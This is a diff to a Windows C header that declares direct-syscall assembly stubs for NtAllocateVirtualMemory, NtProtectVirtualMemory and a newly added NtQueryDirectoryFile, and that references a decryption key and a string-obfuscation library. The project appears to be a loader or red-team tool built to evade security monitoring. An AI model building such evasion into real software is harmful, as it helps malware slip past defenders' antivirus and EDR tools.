@@ -3,8 +3,9 @@
 
 #include <windows.h>
 #include <stdbool.h>
+#include <winternl.h>
 
-#define DEBUG false
+#define DEBUG true
 #define ARRAY_SIZE 1000
 extern unsigned char DECKEY;
 
@@ -43,6 +44,40 @@ typedef BOOL(WINAPI *pFindClose_t)(HANDLE); // FindClose in fileapi.h, loaded in
 typedef HANDLE(WINAPI *pFindFirstFileA_t)(LPCSTR, LPWIN32_FIND_DATAA); // FindFirstFileA in fileapi.h, loaded in kernel32.dll
 typedef BOOL(WINAPI *pQueryPerformance_t)(LARGE_INTEGER*); //for QueryPerformanceFrequency and QueryPerformanceCounter
 
+// typedef struct _UNICODE_STRING {
+//     USHORT Length;
+//     USHORT MaximumLength;
+//     PWSTR  Buffer;
+// } UNICODE_STRING, *PUNICODE_STRING;
+
+// typedef struct _IO_STATUS_BLOCK {
+//     union {
+//         NTSTATUS Status;
+//         PVOID Pointer;
+//     } DUMMYUNIONNAME;
+//     ULONG_PTR Information;
+// } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+
+// typedef VOID (NTAPI *PIO_APC_ROUTINE)(
+//     IN PVOID ApcContext,
+//     IN PIO_STATUS_BLOCK IoStatusBlock,
+//     IN ULONG Reserved
+// );   
+
+typedef NTSTATUS (NTAPI *pNtQueryDirectoryFile)(
+    HANDLE,
+    HANDLE,
+    PIO_APC_ROUTINE,
+    PVOID,
+    PIO_STATUS_BLOCK,
+    PVOID,
+    ULONG,
+    FILE_INFORMATION_CLASS,
+    BOOLEAN,
+    PUNICODE_STRING,
+    BOOLEAN
+);
+
 /*
 Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
 CustAVM: NtAllocateVirtualMemory
@@ -59,6 +94,11 @@ CustPVM: NtProtectVirtualMemory
 */
 extern NTSTATUS CustPVM(HANDLE hProcess, PVOID *BaseAddress, PSIZE_T BufferSize, ULONG NewAccessProtection, PULONG OldAccessProtection);
 
+/*
+Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
+CustQDF: NtQueryDirectoryFile
+*/
+extern NTSTATUS CustQDF(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileMask, BOOLEAN RestartScan);
 /**
  *--------------------------------------------------------------------------------------
  *      Obfuscator - A library for obfuscating strings in a program.
